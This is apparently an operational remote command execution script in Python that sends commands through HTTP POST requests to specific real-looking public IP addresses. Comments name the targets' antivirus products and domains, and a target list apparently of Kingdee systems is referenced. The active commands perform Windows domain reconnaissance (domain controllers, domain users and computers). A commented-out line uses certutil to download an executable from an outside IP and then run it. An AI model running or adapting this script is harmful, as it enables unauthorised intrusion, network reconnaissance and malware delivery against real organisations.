import time,requests,threading,pymongo
...
def exp(url_,command,index):
    ...
    try:
        if 'powershell' in command:
            ...
            time=10
        response = requests.post(url, headers=headers, data=data, proxies=None, timeout=time,verify=False)
        repData = response.text
        res =  repData.split("response_error:")[0].strip()
        # if "authority\system" not in res:
            # return
        print(index,url_)
        print(res)
        # with result_path.open('a+') as file:
            # file.write(url_+line_break)
        return res
...
def exploit(url,index):
    try:
        ...
        # commands=['certutil -urlcache -f http://39.101.76.53:8000/mike.exe D:\\my.exe','D:\\my.exe']
        # commands=[powshell1,powshell2,powshell3,powshell4]
        # commands=['whoami','net user','ipconfig /all',"netstat -an",'systeminfo','tasklist','powershell wmic product get name']
        # commands=['whoami','net user','ipconfig /all']
        # commands=['ipconfig /all']
        # commands=['whoami']
        commands=['net view /domain','net time /domain','net group "Domain Controllers" /domain','net user /domain','net group "domain computers" /domain']


        for command in commands:
            poc_reps=exp(url,command,index)
            time.sleep(2)
        ...
        pass
url="http://14.21.36.83:8000"  #360全家桶   活了 ruitian.com
# url='http://60.172.152.12:2222' #2016 ESET NOD32   tq.com
# command='ipconfig /all' 
exploit(url,1)

threads = []
# with open(r'D:\Downloads\tmp\kingdee.txt', 'r') as file:
